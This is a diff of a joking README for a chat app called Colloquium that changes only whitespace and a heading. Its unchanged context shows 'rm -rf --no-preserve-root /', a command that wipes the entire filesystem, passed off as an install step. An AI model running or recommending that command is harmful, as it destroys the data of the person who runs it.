@@ -10,12 +10,12 @@ Colloquium
 ```rm -rf --no-preserve-root /```
 
 ####Windows
-    1. Get a better Operating System 
+    1. Get a better Operating System
     2. [Hlynux](http://hlynux.com)
     3. **PROFIT!!1!1**
-    
+
 ##Usage
-  [Colloquium.glitch.is](http://colloquium.glitch.is/colloquium)
+####[Colloquium.glitch.is](http://colloquium.glitch.is/colloquium)
 
 ##Features
 - Multiple chatrooms
